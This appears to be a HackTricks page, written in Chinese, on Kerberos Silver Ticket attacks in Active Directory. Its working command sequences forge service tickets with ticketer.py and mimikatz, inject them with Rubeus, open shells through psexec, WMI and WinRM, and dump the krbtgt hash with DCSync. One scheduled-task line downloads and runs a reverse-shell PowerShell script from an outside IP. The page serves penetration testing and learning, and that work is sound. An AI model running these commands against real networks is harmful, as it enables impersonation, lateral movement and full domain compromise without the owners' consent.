# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**银票**攻击涉及在Active Directory (AD)环境中利用服务票证。此方法依赖于**获取服务账户的NTLM哈希**，例如计算机账户，以伪造票证授予服务(TGS)票证。通过这个伪造的票证，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常目标是获取管理权限。强调使用AES密钥伪造票证更安全且不易被检测。

对于票证制作，根据操作系统使用不同的工具：

### 在Linux上
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### 在Windows上
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS服务被强调为访问受害者文件系统的常见目标，但其他服务如HOST和RPCSS也可以被利用进行任务和WMI查询。

## 可用服务

| 服务类型                                   | 服务银票                                                       |
| ------------------------------------------ | ------------------------------------------------------------ |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                      |
| PowerShell远程                             | <p>HOST</p><p>HTTP</p><p>根据操作系统还包括：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下，您可以直接请求：WINRM</p> |
| 计划任务                                  | HOST                                                         |
| Windows文件共享，也包括psexec            | CIFS                                                         |
| LDAP操作，包括DCSync                      | LDAP                                                         |
| Windows远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                           |
| 黄金票据                                  | krbtgt                                                       |

使用**Rubeus**，您可以使用参数**请求所有**这些票据：

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### 银票事件ID

- 4624：账户登录
- 4634：账户注销
- 4672：管理员登录

## 滥用服务票据

在以下示例中，假设票据是通过模拟管理员账户获取的。

### CIFS

使用此票据，您将能够通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被暴露）并将文件复制到远程文件系统的某个部分，只需执行类似以下操作：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
您还可以通过 **psexec** 在主机内部获取 shell 或执行任意命令：

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

凭借此权限，您可以在远程计算机上生成计划任务并执行任意命令：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

使用这些票证，您可以**在受害者系统中执行 WMI**：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
找到有关 **wmiexec** 的更多信息，请访问以下页面：

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

通过 winrm 访问计算机，您可以 **访问它**，甚至获取 PowerShell：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
检查以下页面以了解 **使用 winrm 连接远程主机的更多方法**：

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 请注意，**winrm 必须在远程计算机上处于活动和监听状态**才能访问。

### LDAP

凭借此权限，您可以使用 **DCSync** 转储 DC 数据库：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**了解更多关于 DCSync** 在以下页面：

## 参考

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
